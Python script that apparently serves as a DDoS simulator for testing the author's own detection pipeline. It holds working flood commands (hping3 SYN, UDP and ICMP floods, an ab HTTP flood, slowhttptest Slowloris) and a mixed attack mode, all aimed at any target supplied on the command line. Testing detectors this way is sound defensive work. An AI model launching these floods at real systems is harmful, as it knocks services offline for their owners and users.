#!/usr/bin/env python3
"""
DDoS Attack Simulator

Simulates different types of DDoS attacks for testing detection system.
Uses hping3 for packet generation (requires root/sudo).
"""

import subprocess
import time
import sys
import argparse
from typing import List

class DDoSSimulator:
    """Simulate DDoS attacks for testing"""
    
    ATTACK_TYPES = {
        'syn_flood': {
            'name': 'SYN Flood',
            'command': 'hping3 -S --flood -p {port} {target}',
            'description': 'TCP SYN flood attack',
            'duration': 30
        },
        'udp_flood': {
            'name': 'UDP Flood',
            'command': 'hping3 --udp --flood -p {port} {target}',
            'description': 'UDP flood attack',
            'duration': 30
        },
        'icmp_flood': {
            'name': 'ICMP Flood (Ping of Death)',
            'command': 'hping3 --icmp --flood {target}',
            'description': 'ICMP flood attack',
            'duration': 30
        },
        'http_flood': {
            'name': 'HTTP Flood',
            'command': 'ab -n 10000 -c 100 http://{target}:{port}/',
            'description': 'HTTP request flood',
            'duration': 60
        },
        'slowloris': {
            'name': 'Slowloris',
            'command': 'slowhttptest -c 1000 -H -g -o /tmp/slowloris -i 10 -r 200 -t GET -u http://{target}:{port}',
            'description': 'Slow HTTP attack',
            'duration': 120
        }
    }
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        
    def check_dependencies(self) -> bool:
        """Check if required tools are installed"""
        tools = {
            'hping3': 'sudo apt-get install hping3',
            'ab': 'sudo apt-get install apache2-utils'
        }
        
        missing = []
        for tool, install_cmd in tools.items():
            try:
                subprocess.run(['which', tool], 
                             capture_output=True, 
                             check=True)
                print(f"✅ {tool} found")
            except subprocess.CalledProcessError:
                print(f"❌ {tool} not found")
                print(f"   Install: {install_cmd}")
                missing.append(tool)
        
        return len(missing) == 0
    
    def run_attack(self, attack_type: str, duration: int = None):
        """Run specific attack type"""
        if attack_type not in self.ATTACK_TYPES:
            print(f"❌ Unknown attack type: {attack_type}")
            print(f"Available: {', '.join(self.ATTACK_TYPES.keys())}")
            return
        
        attack = self.ATTACK_TYPES[attack_type]
        duration = duration or attack['duration']
        
        print(f"\n{'='*60}")
        print(f"🚨 Starting {attack['name']}")
        print(f"   Target: {self.target}:{self.port}")
        print(f"   Duration: {duration}s")
        print(f"   Description: {attack['description']}")
        print(f"{'='*60}\n")
        
        # Format command
        cmd = attack['command'].format(target=self.target, port=self.port)
        
        try:
            # Run attack in background with timeout
            print(f"Command: {cmd}")
            process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for duration
            time.sleep(duration)
            
            # Stop attack
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            print(f"\n✅ Attack completed")
            
        except Exception as e:
            print(f"❌ Error running attack: {e}")
    
    def run_mixed_attack(self, duration: int = 60):
        """Run mixed attack (multiple types)"""
        print(f"\n{'='*60}")
        print(f"🚨🚨🚨 MIXED ATTACK")
        print(f"   Target: {self.target}:{self.port}")
        print(f"   Duration: {duration}s")
        print(f"   Types: SYN + UDP + ICMP")
        print(f"{'='*60}\n")
        
        processes = []
        
        # Start multiple attacks
        for attack_type in ['syn_flood', 'udp_flood', 'icmp_flood']:
            attack = self.ATTACK_TYPES[attack_type]
            cmd = attack['command'].format(target=self.target, port=self.port)
            
            print(f"Starting {attack['name']}...")
            process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            processes.append(process)
        
        # Wait
        time.sleep(duration)
        
        # Stop all
        print("\nStopping attacks...")
        for process in processes:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
        
        print("✅ Mixed attack completed")

def main():
    parser = argparse.ArgumentParser(
        description='DDoS Attack Simulator for Testing'
    )
    parser.add_argument('target', help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=80, 
                       help='Target port (default: 80)')
    parser.add_argument('-t', '--type', choices=list(DDoSSimulator.ATTACK_TYPES.keys()) + ['mixed'],
                       default='syn_flood',
                       help='Attack type (default: syn_flood)')
    parser.add_argument('-d', '--duration', type=int, default=None,
                       help='Attack duration in seconds')
    parser.add_argument('--check', action='store_true',
                       help='Check dependencies only')
    
    args = parser.parse_args()
    
    simulator = DDoSSimulator(args.target, args.port)
    
    if args.check:
        print("Checking dependencies...")
        if simulator.check_dependencies():
            print("\n✅ All dependencies installed")
        else:
            print("\n❌ Missing dependencies")
            sys.exit(1)
        return
    
    # Check dependencies first
    if not simulator.check_dependencies():
        print("\n❌ Please install missing dependencies first")
        sys.exit(1)
    
    # Warning
    print("\n⚠️  WARNING: This will generate attack traffic!")
    print("   Only use on systems you own or have permission to test.")
    response = input("Continue? (yes/no): ")
    if response.lower() != 'yes':
        print("Aborted.")
        return
    
    # Run attack
    if args.type == 'mixed':
        simulator.run_mixed_attack(args.duration or 60)
    else:
        simulator.run_attack(args.type, args.duration)
    
    print("\n" + "="*60)
    print("💡 Check your detection system:")
    print("   - Kafka: kafka-console-consumer.sh --topic ddos-alerts")
    print("   - Logs: docker logs ids_ddos_detector")
    print("   - Metrics: curl http://localhost:8001/metrics")
    print("="*60)

if __name__ == "__main__":
    main()
